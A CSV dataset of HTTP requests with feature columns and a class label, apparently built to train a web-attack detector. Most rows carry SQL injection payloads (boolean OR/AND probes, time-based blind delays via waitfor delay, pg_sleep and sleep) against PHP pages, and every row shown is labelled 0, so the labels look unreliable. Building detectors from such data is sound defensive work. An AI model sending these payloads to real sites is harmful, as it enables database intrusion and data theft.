method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,"b""/showimage.php?file=./pictures/4.jpg&size=-1));%20waitfor%20delay%20'0:0:15'%20--%20""",b'',2,0,1,0,5,2,0
GET,b'/comment.php?pid=1ACUSTART%20ACUEND',b'',0,0,0,0,1,0,0
POST,b'/cart.php',b'addcart=3&price=500',0,0,0,0,0,0,0
GET,b'/hpp/params.php?aaaa=&p=1&pp=-1%20OR%203*2<(0%2b5%2b594-594)%20--%20',b'',0,0,1,1,4,0,0
POST,b'/userinfo.php',b'pass=g00dPa%24%24w0rD&uname=-1%20OR%202%2b903-903-1%3d0%2b0%2b0%2b1',0,0,0,0,2,0,0
GET,b'/listproducts.php?artist=1&cat=11-2*6%2b0%2b0%2b1-1',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=1%20AND%203*2%3d5%20AND%20672%3d672',b'',0,0,0,0,4,0,0
GET,"b""/showimage.php?file=./pictures/4.jpg&size=1%20waitfor%20delay%20'0:0:5'%20--%20""",b'',2,0,1,0,5,2,0
GET,b'/comment.php?pid=qUVhhWUT',b'',0,0,0,0,0,0,0
GET,b'/comment.php?pid=1ACUSTART%5c',b'',0,0,0,0,0,0,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%202%2b86-86-1%3d0%2b0%2b0%2b1%20--%20""",1,0,1,0,4,0,0
GET,b'/hpp/params.php?aaaa=&p=1&pp=-1%20OR%203*2>(0%2b5%2b594-594)%20--%20',b'',0,0,1,1,4,0,0
GET,b'/listproducts.php?artist=1&cat=1%20AND%202%2b1-1-1%3d1%20AND%20457%3d457',b'',0,0,0,0,4,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',b'Type=-1%20OR%202%2b57-57-1%3d0%2b0%2b0%2b1%20--%20',0,0,1,0,4,0,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=1%20AND%203*2%3d6%20AND%20672%3d672',b'',0,0,0,0,4,0,0
GET,b'/comment.php?pid=-1%20OR%202%2b377-377-1%3d0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,0
GET,"b""/showimage.php?file=./pictures/4.jpg&size=tFVoJOo1';%20waitfor%20delay%20'0:0:5'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=1ACUSTART'%22EOL7gACUEND""",1,1,0,0,0,0,0
POST,b'/cart.php',b'addcart=LKO5lnOt&price=500',0,0,0,0,0,0,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203%2b86-86-1%3d0%2b0%2b0%2b1%20--%20""",1,0,1,0,4,0,0
GET,b'/hpp/params.php?aaaa=&p=1&pp=-1%20OR%202%2b987-987-1%3d0%2b0%2b0%2b1',b'',0,0,0,0,2,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',b'Type=-1%20OR%202%2b446-446-1%3d0%2b0%2b0%2b1',0,0,0,0,2,0,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=1%20AND%203*2*0%3d6%20AND%20672%3d672',b'',0,0,0,0,4,0,0
GET,b'/listproducts.php?artist=1&cat=1%20AND%203%2b1-1-1%3d1%20AND%20457%3d457',b'',0,0,0,0,4,0,0
GET,b'/comment.php?pid=-1%20OR%202%2b834-834-1%3d0%2b0%2b0%2b1',b'',0,0,0,0,2,0,0
GET,"b""/showimage.php?file=./pictures/4.jpg&size=SV1TvYQi');%20waitfor%20delay%20'0:0:5'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/_mmServerScripts/MMHTTPDB.php',b'Type=1ACUSTART%20ACUEND',0,0,0,0,1,0,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203*2<(0%2b5%2b86-86)%20--%20""",1,0,1,1,4,0,0
POST,b'/cart.php',b'addcart=-1%20OR%202%2b160-160-1%3d0%2b0%2b0%2b1%20--%20&price=500',0,0,1,0,4,0,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=-1'%20OR%202%2b531-531-1%3d0%2b0%2b0%2b1%20--%20""",b'',1,0,1,0,4,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=-1'%20OR%202%2b177-177-1%3d0%2b0%2b0%2b1%20--%20""",1,0,1,0,4,0,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=1%20AND%203*2*1%3d6%20AND%20672%3d672',b'',0,0,0,0,4,0,0
GET,b'/listproducts.php?artist=1&cat=1%20AND%203*2%3d5%20AND%20457%3d457',b'',0,0,0,0,4,0,0
GET,"b""/comment.php?pid=-1'%20OR%202%2b158-158-1%3d0%2b0%2b0%2b1%20--%20""",b'',1,0,1,0,4,0,0
GET,"b""/showimage.php?file=./pictures/4.jpg&size=EtYYqrR5'));%20waitfor%20delay%20'0:0:5'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/_mmServerScripts/MMHTTPDB.php',b'Type=1ACUSTART%5c',0,0,0,0,0,0,0
POST,b'/cart.php',b'addcart=-1%20OR%202%2b905-905-1%3d0%2b0%2b0%2b1&price=500',0,0,0,0,2,0,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203*2>(0%2b5%2b86-86)%20--%20""",1,0,1,1,4,0,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=-1'%20OR%203%2b531-531-1%3d0%2b0%2b0%2b1%20--%20""",b'',1,0,1,0,4,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=-1'%20OR%202%2b134-134-1%3d0%2b0%2b0%2b1%20or%20'n0dTfDV3'%3d'""",4,0,0,0,4,0,0
GET,b'/listproducts.php?artist=1&cat=1%20AND%203*2%3d6%20AND%20457%3d457',b'',0,0,0,0,4,0,0
GET,"b""/comment.php?pid=-1'%20OR%202%2b853-853-1%3d0%2b0%2b0%2b1%20or%20'OdhfCWvt'%3d'""",b'',4,0,0,0,4,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,0,2,0,0
GET,b'/showimage.php?file=./pictures/4.jpg&size=-1;select%20pg_sleep(5);%20--%20',b'',0,0,1,1,3,2,0
POST,b'/cart.php',"b""addcart=-1'%20OR%202%2b886-886-1%3d0%2b0%2b0%2b1%20--%20&price=500""",1,0,1,0,4,0,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%202%2b1-1-1%3d1%20AND%2086%3d86%20--%20""",1,0,1,0,6,0,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=-1'%20OR%203*2<(0%2b5%2b531-531)%20--%20""",b'',1,0,1,1,4,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',b'Type=-1%22%20OR%202%2b960-960-1%3d0%2b0%2b0%2b1%20--%20',0,1,1,0,4,0,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=0%2b441*436%2b1',b'',0,0,0,0,0,0,0
GET,b'/listproducts.php?artist=1&cat=1%20AND%203*2*0%3d6%20AND%20457%3d457',b'',0,0,0,0,4,0,0
GET,b'/comment.php?pid=-1%22%20OR%202%2b351-351-1%3d0%2b0%2b0%2b1%20--%20',b'',0,1,1,0,4,0,0
POST,b'/cart.php',"b""addcart=-1'%20OR%202%2b606-606-1%3d0%2b0%2b0%2b1%20or%20'kQGyBHdl'%3d'&price=500""",4,0,0,0,4,0,0
GET,b'/showimage.php?file=./pictures/4.jpg&size=-1);select%20pg_sleep(5);%20--%20',b'',0,0,1,1,3,2,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%2086%3d86%20AND%203%2b1-1-1%3d1%20--%20""",1,0,1,0,6,0,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=-1'%20OR%203*2>(0%2b5%2b531-531)%20--%20""",b'',1,0,1,1,4,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/""",2,2,0,14,0,3,0
POST,b'/AJAX/showxml.php',b'dGjhqyw7',0,0,0,0,0,0,0
GET,b'/listproducts.php?artist=1&cat=1%20AND%203*2*1%3d6%20AND%20457%3d457',b'',0,0,0,0,4,0,0
GET,"b""/comment.php?pid=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
POST,b'/cart.php',b'addcart=-1%22%20OR%202%2b377-377-1%3d0%2b0%2b0%2b1%20--%20&price=500',0,1,1,0,4,0,0
GET,b'/showimage.php?file=./pictures/4.jpg&size=-1));select%20pg_sleep(10);%20--%20',b'',0,0,1,1,3,2,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203*2%3d5%20AND%2086%3d86%20--%20""",1,0,1,0,6,0,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=-1'%20OR%202%2b366-366-1%3d0%2b0%2b0%2b1%20or%20'9yUNEaCQ'%3d'""",b'',4,0,0,0,4,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/""",2,2,0,15,0,9,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>\' AND 2+1-1-1=0+0+0+1 AND \'soLZ\'=\'soLZ'",4,4,0,0,6,0,0
GET,"b""/comment.php?pid=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/""",b'',2,2,0,15,0,9,0
POST,b'/cart.php',"b""addcart=if(now()%3dsysdate()%2csleep(8)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(8)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(8)%2c0))OR%22*/&price=500""",2,2,0,14,0,3,0
GET,"b""/showimage.php?file=./pictures/4.jpg&size=PEvWUn85';select%20pg_sleep(15);%20--%20""",b'',1,0,1,1,3,2,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203*2%3d6%20AND%2086%3d86%20--%20""",1,0,1,0,6,0,0
GET,b'/hpp/params.php?aaaa=&p=1&pp=-1%22%20OR%202%2b531-531-1%3d0%2b0%2b0%2b1%20--%20',b'',0,1,1,0,4,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=-1;%20waitfor%20delay%20'0:0:9'%20--%20""",2,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>"" AND 2+1-1-1=0+0+0+1 AND ""aKS1""=""aKS1'",0,8,0,0,6,0,0
POST,b'/search.php?test=1',"b""searchFor=if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/""",2,2,0,14,0,3,0
GET,"b""/comment.php?pid=-1;%20waitfor%20delay%20'0:0:9'%20--%20""",b'',2,0,1,0,5,2,0
GET,b'/listproducts.php?artist=1&cat=0%2b991*986%2b1',b'',0,0,0,0,0,0,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203*2*0%3d6%20AND%2086%3d86%20--%20""",1,0,1,0,6,0,0
POST,b'/cart.php',"b""addcart=(select(0)from(select(sleep(12)))v)/*'%2b(select(0)from(select(sleep(12)))v)%2b'%22%2b(select(0)from(select(sleep(12)))v)%2b%22*/&price=500""",2,2,0,15,0,9,0
GET,"b""/showimage.php?file=./pictures/4.jpg&size=haItCtEz');select%20pg_sleep(15);%20--%20""",b'',1,0,1,1,3,2,0
GET,b'/hpp/params.php?aaaa=&p=1&pp=-1%22%20OR%203%2b531-531-1%3d0%2b0%2b0%2b1%20--%20',b'',0,1,1,0,4,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=-1);%20waitfor%20delay%20'0:0:9'%20--%20""",2,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>%\' AND 2+1-1-1=0+0+0+1 AND \'XGgN\'!=\'XGgN%'",4,4,0,0,6,0,0
POST,b'/search.php?test=1',"b""searchFor=if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*/""",2,2,0,14,0,3,0
GET,"b""/comment.php?pid=-1);%20waitfor%20delay%20'0:0:3'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203*2*1%3d6%20AND%2086%3d86%20--%20""",1,0,1,0,6,0,0
GET,"b""/showimage.php?file=./pictures/4.jpg&size=BdJJrM6x'));select%20pg_sleep(5);%20--%20""",b'',1,0,1,1,3,2,0
POST,b'/cart.php',"b""addcart=-1;%20waitfor%20delay%20'0:0:4'%20--%20&price=500""",2,0,1,0,5,2,0
GET,b'/hpp/params.php?aaaa=&p=1&pp=-1%22%20OR%203*2<(0%2b5%2b531-531)%20--%20',b'',0,1,1,1,4,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=-1));%20waitfor%20delay%20'0:0:3'%20--%20""",2,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b'if(now()=sysdate(),sleep(3),0)/*\'XOR(if(now()=sysdate(),sleep(3),0))OR\'""XOR(if(now()=sysdate(),sleep(3),0))OR""*/'",2,2,0,14,0,3,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=1%20AND%202%2b1-1-1%3d1%20AND%20441%3d441',b'',0,0,0,0,4,0,0
GET,"b""/comment.php?pid=-1));%20waitfor%20delay%20'0:0:3'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%202%2b65-65-1%3d0%2b0%2b0%2b1%20--%20""",1,0,1,0,4,0,0
POST,b'/cart.php',"b""addcart=-1);%20waitfor%20delay%20'0:0:8'%20--%20&price=500""",2,0,1,0,5,2,0
GET,b'/showimage.php?file=./pictures/2.jpg&size=160',b'',0,0,0,0,0,0,0
GET,b'/hpp/params.php?aaaa=&p=1&pp=-1%22%20OR%203*2>(0%2b5%2b531-531)%20--%20',b'',0,1,1,1,4,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=1%20waitfor%20delay%20'0:0:6'%20--%20""",2,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b'(select(0)from(select(sleep(6)))v)/*\'+(select(0)from(select(sleep(6)))v)+\'""+(select(0)from(select(sleep(6)))v)+""*/'",2,2,0,15,0,9,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=1%20AND%203%2b1-1-1%3d1%20AND%20441%3d441',b'',0,0,0,0,4,0,0
GET,"b""/comment.php?pid=1%20waitfor%20delay%20'0:0:6'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/cart.php',"b""addcart=-1));%20waitfor%20delay%20'0:0:8'%20--%20&price=500""",2,0,1,0,5,2,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203%2b65-65-1%3d0%2b0%2b0%2b1%20--%20""",1,0,1,0,4,0,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=2wAlBt1L';%20waitfor%20delay%20'0:0:9'%20--%20""",3,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b""1 waitfor delay '0:0:9' --""",2,0,1,0,5,2,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=1%20AND%203*2%3d5%20AND%20441%3d441',b'',0,0,0,0,4,0,0
POST,b'/cart.php',"b""addcart=1%20waitfor%20delay%20'0:0:12'%20--%20&price=500""",2,0,1,0,5,2,0
GET,"b""/comment.php?pid=N6I9Q5Hm';%20waitfor%20delay%20'0:0:9'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203*2<(0%2b5%2b65-65)%20--%20""",1,0,1,1,4,0,0
GET,b'/showimage.php?file=./pictures/2.jpg&size=UxPJgA4d',b'',0,0,0,0,0,0,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/""",b'',2,2,0,15,0,9,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=CG4dAvNd');%20waitfor%20delay%20'0:0:9'%20--%20""",3,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b""cDW7PUeX'; waitfor delay '0:0:3' --""",3,0,1,0,5,2,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=1%20AND%203*2%3d6%20AND%20441%3d441',b'',0,0,0,0,4,0,0
POST,b'/cart.php',"b""addcart=rNEDteGj';%20waitfor%20delay%20'0:0:4'%20--%20&price=500""",3,0,1,0,5,2,0
GET,b'/listproducts.php?artist=1&cat=1%20AND%202%2b1-1-1%3d1%20AND%20991%3d991',b'',0,0,0,0,4,0,0
GET,"b""/comment.php?pid=VPjdTlKB');%20waitfor%20delay%20'0:0:3'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203*2>(0%2b5%2b65-65)%20--%20""",1,0,1,1,4,0,0
GET,b'/showimage.php?file=./pictures/2.jpg&size=-1%20OR%202%2b925-925-1%3d0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=-1;%20waitfor%20delay%20'0:0:3'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=fei5qZCO'));%20waitfor%20delay%20'0:0:3'%20--%20""",3,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b""QMbhVwCI'); waitfor delay '0:0:3' --""",3,0,1,0,5,2,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=1%20AND%203*2*0%3d6%20AND%20441%3d441',b'',0,0,0,0,4,0,0
POST,b'/cart.php',"b""addcart=BlBIfIHx');%20waitfor%20delay%20'0:0:8'%20--%20&price=500""",3,0,1,0,5,2,0
GET,b'/listproducts.php?artist=1&cat=1%20AND%203%2b1-1-1%3d1%20AND%20991%3d991',b'',0,0,0,0,4,0,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%202%2b1-1-1%3d1%20AND%2000065%3d00065%20--%20""",1,0,1,0,6,0,0
GET,"b""/comment.php?pid=HOA3ZqLK'));%20waitfor%20delay%20'0:0:6'%20--%20""",b'',3,0,1,0,5,2,0
GET,b'/showimage.php?file=./pictures/2.jpg&size=-1%20OR%202%2b217-217-1%3d0%2b0%2b0%2b1',b'',0,0,0,0,2,0,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=-1);%20waitfor%20delay%20'0:0:6'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/_mmServerScripts/MMHTTPDB.php',b'Type=-1;select%20pg_sleep(6);%20--%20',0,0,1,1,3,2,0
POST,b'/search.php?test=1',"b""searchFor=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/""",2,2,0,14,0,3,0
POST,b'/AJAX/showxml.php',"b""aTl7dgmn')); waitfor delay '0:0:6' --""",3,0,1,0,5,2,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=1%20AND%203*2*1%3d6%20AND%20441%3d441',b'',0,0,0,0,4,0,0
POST,b'/cart.php',"b""addcart=y9E4x6r9'));%20waitfor%20delay%20'0:0:8'%20--%20&price=500""",3,0,1,0,5,2,0
GET,b'/listproducts.php?artist=1&cat=1%20AND%203*2%3d5%20AND%20991%3d991',b'',0,0,0,0,4,0,0
GET,b'/comment.php?pid=-1;select%20pg_sleep(9);%20--%20',b'',0,0,1,1,3,2,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%2000065%3d00065%20AND%203%2b1-1-1%3d1%20--%20""",1,0,1,0,6,0,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=-1'%20OR%202%2b671-671-1%3d0%2b0%2b0%2b1%20--%20""",b'',1,0,1,0,4,0,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=-1));%20waitfor%20delay%20'0:0:9'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/_mmServerScripts/MMHTTPDB.php',b'Type=-1);select%20pg_sleep(9);%20--%20',0,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',"b""35mwgUMo';select pg_sleep(9); --""",1,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',"b'1ACUSTART\'""WPymYACUEND'",1,1,0,0,0,0,0
POST,b'/cart.php',b'addcart=-1;select%20pg_sleep(12);%20--%20&price=500',0,0,1,1,3,2,0
GET,b'/listproducts.php?artist=1&cat=1%20AND%203*2%3d6%20AND%20991%3d991',b'',0,0,0,0,4,0,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203*2%3d5%20AND%2000065%3d00065%20--%20""",1,0,1,0,6,0,0
GET,b'/comment.php?pid=-1);select%20pg_sleep(9);%20--%20',b'',0,0,1,1,3,2,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=1%20waitfor%20delay%20'0:0:3'%20--%20""",b'',2,0,1,0,5,2,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=-1'%20OR%202%2b996-996-1%3d0%2b0%2b0%2b1%20or%20'vxMW7cVR'%3d'""",b'',4,0,0,0,4,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',b'Type=-1));select%20pg_sleep(3);%20--%20',0,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',"b""TM4dO2Ye');select pg_sleep(3); --""",1,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',b'1ACUSTART ACUEND',0,0,0,0,1,0,0
POST,b'/cart.php',b'addcart=-1);select%20pg_sleep(4);%20--%20&price=500',0,0,1,1,3,2,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203*2%3d6%20AND%2000065%3d00065%20--%20""",1,0,1,0,6,0,0
GET,b'/comment.php?pid=-1));select%20pg_sleep(3);%20--%20',b'',0,0,1,1,3,2,0
GET,b'/listproducts.php?artist=1&cat=1%20AND%203*2*0%3d6%20AND%20991%3d991',b'',0,0,0,0,4,0,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=xiIEMMaP';%20waitfor%20delay%20'0:0:3'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=YAsE7lN9';select%20pg_sleep(6);%20--%20""",1,0,1,1,3,2,0
GET,b'/showimage.php?file=./pictures/2.jpg&size=-1%22%20OR%202%2b627-627-1%3d0%2b0%2b0%2b1%20--%20',b'',0,1,1,0,4,0,0
POST,b'/AJAX/showxml.php',"b""92hPVrip'));select pg_sleep(6); --""",1,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',b'1ACUSTART\\',0,0,0,0,0,0,0
POST,b'/cart.php',b'addcart=-1));select%20pg_sleep(8);%20--%20&price=500',0,0,1,1,3,2,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203*2*0%3d6%20AND%2000065%3d00065%20--%20""",1,0,1,0,6,0,0
GET,"b""/comment.php?pid=AGxlZVwm';select%20pg_sleep(6);%20--%20""",b'',1,0,1,1,3,2,0
GET,b'/listproducts.php?artist=1&cat=1%20AND%203*2*1%3d6%20AND%20991%3d991',b'',0,0,0,0,4,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=4kL4YKq6');select%20pg_sleep(6);%20--%20""",1,0,1,1,3,2,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=05bJttab');%20waitfor%20delay%20'0:0:6'%20--%20""",b'',3,0,1,0,5,2,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=if(now()%3dsysdate()%2csleep(18)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(18)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(18)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""1ACUSTART&apos;&quot;0hlGhACUEND"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,0,2,0,0
POST,b'/cart.php',"b""addcart=bgxFjAZB';select%20pg_sleep(12);%20--%20&price=500""",1,0,1,1,3,2,0
POST,b'/userinfo.php',"b""pass=g00dPa%24%24w0rD&uname=-1'%20OR%203*2*1%3d6%20AND%2000065%3d00065%20--%20""",1,0,1,0,6,0,0
POST,b'/_mmServerScripts/MMHTTPDB.php',"b""Type=MwZ17Dr7'));select%20pg_sleep(9);%20--%20""",1,0,1,1,3,2,0
GET,"b""/comment.php?pid=jM1Nb9Dh');select%20pg_sleep(9);%20--%20""",b'',1,0,1,1,3,2,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=34pudQrg'));%20waitfor%20delay%20'0:0:9'%20--%20""",b'',3,0,1,0,5,2,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=(select(0)from(select(sleep(18)))v)/*'%2b(select(0)from(select(sleep(18)))v)%2b'%22%2b(select(0)from(select(sleep(18)))v)%2b%22*/""",b'',2,2,0,15,0,9,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""1ACUSTART ACUEND"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,0,3,0,0
POST,b'/cart.php',"b""addcart=HS642JaX');select%20pg_sleep(4);%20--%20&price=500""",1,0,1,1,3,2,0
POST,b'/comment.php?aid=1&pid=1',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,0,0,3,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/comment.php?pid=lPCWbvKG'));select%20pg_sleep(3);%20--%20""",b'',1,0,1,1,3,2,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=-1;%20waitfor%20delay%20'0:0:6'%20--%20""",b'',2,0,1,0,5,2,0
GET,b'/hpp/params.php?aaaa=&p=1&pp=-1;select%20pg_sleep(3);%20--%20',b'',0,0,1,1,3,2,0
